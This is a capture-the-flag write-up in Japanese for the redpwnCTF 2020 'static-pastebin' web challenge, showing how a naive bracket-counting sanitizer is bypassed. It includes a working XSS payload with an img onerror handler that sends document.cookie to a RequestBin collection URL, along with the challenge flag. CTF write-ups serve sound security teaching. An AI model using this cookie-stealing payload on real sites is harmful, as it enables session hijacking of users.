# static-pastebin:web:373pts
I wanted to make a website to store bits of text, but I don't have any experience with web development. However, I realized that I don't need any! If you experience any issues, make a paste and send it [here](https://admin-bot.redpwnc.tf/submit?challenge=static-pastebin)  
Site: [static-pastebin.2020.redpwnc.tf](https://static-pastebin.2020.redpwnc.tf/)  
Note: The site is entirely static. Dirbuster will not be useful in solving it.  

# Solution
ターゲットサイトとAdmin Botへ巡回命令を出せるサイトが与えられる。  
Static Pastebin  
[site1.png](site/site1.png)  
Static Pastebin Admin Bot Submission  
[site2.png](site/site2.png)  
入力によりユーザがページを作成できるようだ。  
そのページをAdmin Botに渡し、XSSでクッキーを抜く可能性が高い。  
作成したページでのXSSを試み、[RequestBin.com](https://requestbin.com/)で待ち受ける。  
作成したページでは以下のスクリプト(script.js)が動いていた。  
```JavaScript:script.js
(async () => {
    await new Promise((resolve) => {
        window.addEventListener('load', resolve);
    });

    const content = window.location.hash.substring(1);
    display(atob(content));
})();

function display(input) {
    document.getElementById('paste').innerHTML = clean(input);
}

function clean(input) {
    let brackets = 0;
    let result = '';
    for (let i = 0; i < input.length; i++) {
        const current = input.charAt(i);
        if (current == '<') {
            brackets ++;
        }
        if (brackets == 0) {
            result += current;
        }
        if (current == '>') {
            brackets --;
        }
    }
    return result
}
```
`<`と`>`をカウントしタグをブロックしている。  
しかし以下のように一度`>`をかませるとタグを書き込める。  
```html
><img src=1 onerror="window.location.href='https://[RequestBinURL]?get='+document.cookie">
```
これによって作成されたページをAdmin Botに渡すとflagが得られる。  
```text
GET/?get=flag=flag{54n1t1z4t10n_k1nd4_h4rd}
```

## flag{54n1t1z4t10n_k1nd4_h4rd}